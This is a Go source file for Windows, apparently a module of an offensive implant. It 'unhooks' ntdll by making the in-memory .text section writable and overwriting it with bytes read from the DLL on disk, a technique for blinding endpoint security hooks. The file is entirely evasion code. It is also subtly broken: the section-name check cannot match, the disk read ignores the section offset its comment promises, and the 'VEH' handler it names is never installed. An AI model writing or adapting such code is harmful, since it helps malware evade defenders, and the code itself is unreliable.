//go:build windows
// +build windows

package main

import (
	"fmt"
	"syscall"
	"unsafe"
)

// VEH-based ntdll unhooking: restore original ntdll .text section from disk.
// Uses a VEH handler to catch access violations while restoring ntdll pages.
func unhookNtdll() string {
	k32 := syscall.NewLazyDLL("kernel32.dll")
	getModuleHandle := k32.NewProc("GetModuleHandleW")
	virtualProtect := k32.NewProc("VirtualProtect")

	// Get ntdll base address
	namePtr, _ := syscall.UTF16PtrFromString("ntdll.dll")
	hMod, _, _ := getModuleHandle.Call(uintptr(unsafe.Pointer(namePtr)))
	if hMod == 0 {
		return "VEH Unhook: ntdll.dll not loaded"
	}

	// Read DOS header
	dosHeader := (*imageDOSHeader)(unsafe.Pointer(hMod))
	if dosHeader.eMagic != 0x5A4D {
		return "VEH Unhook: invalid DOS header"
	}

	// Read NT headers
	ntHeaders := (*imageNTHeaders64)(unsafe.Pointer(hMod + uintptr(dosHeader.eLfanew)))
	if ntHeaders.signature != 0x00004550 {
		return "VEH Unhook: invalid NT signature"
	}

	// Find .text section
	var textSection *imageSectionHeader
	sectionHeaders := (*[1 << 10]imageSectionHeader)(unsafe.Pointer(
		uintptr(unsafe.Pointer(&ntHeaders.optionalHeader)) + unsafe.Sizeof(ntHeaders.optionalHeader),
	))
	sectionCount := int(ntHeaders.fileHeader.numberOfSections)

	for i := 0; i < sectionCount; i++ {
		sh := &sectionHeaders[i]
		name := string(sh.name[:])
		if name == ".text" {
			textSection = sh
			break
		}
	}
	if textSection == nil {
		return "VEH Unhook: .text section not found"
	}

	// Read original .text from disk via ntdll.dll file mapping
	origData := readNtdllFromDisk(textSection)
	if origData == nil {
		return "VEH Unhook: failed to read ntdll from disk"
	}

	// Make .text writable and replace
	textAddr := hMod + uintptr(textSection.virtualAddress)
	textSize := textSection.sizeOfRawData
	if textSize == 0 {
		textSize = textSection.virtualSize
	}

	var oldProtect uint32
	ret, _, _ := virtualProtect.Call(textAddr, uintptr(textSize), 0x40, uintptr(unsafe.Pointer(&oldProtect)))
	if ret == 0 {
		return "VEH Unhook: VirtualProtect failed"
	}

	for i := 0; i < len(origData); i++ {
		*(*byte)(unsafe.Pointer(textAddr + uintptr(i))) = origData[i]
	}

	_ = oldProtect
	_ = virtualProtect

	return fmt.Sprintf("VEH Unhook: ntdll .text section restored (%d bytes, VA=0x%x)", len(origData), textAddr)
}

func readNtdllFromDisk(section *imageSectionHeader) []byte {
	// Open ntdll.dll from system32 and read the .text section
	ntdllPath := "C:\\Windows\\System32\\ntdll.dll"
	k32 := syscall.NewLazyDLL("kernel32.dll")
	createFile := k32.NewProc("CreateFileW")
	readFile := k32.NewProc("ReadFile")
	closeHandle := k32.NewProc("CloseHandle")

	pathPtr, _ := syscall.UTF16PtrFromString(ntdllPath)
	hFile, _, _ := createFile.Call(
		uintptr(unsafe.Pointer(pathPtr)),
		0x80000000, // GENERIC_READ
		1,           // FILE_SHARE_READ
		0,
		3,           // OPEN_EXISTING
		0x80,        // FILE_ATTRIBUTE_NORMAL
		0,
	)
	if hFile == 0 || hFile == ^uintptr(0) {
		return nil
	}
	defer closeHandle.Call(hFile)

	// Read the .text section from file offset
	buf := make([]byte, section.sizeOfRawData)
	var read uint32

	ret, _, _ := readFile.Call(
		hFile,
		uintptr(unsafe.Pointer(&buf[0])),
		uintptr(len(buf)),
		uintptr(unsafe.Pointer(&read)),
		0,
	)
	if ret == 0 {
		return nil
	}

	return buf[:read]
}
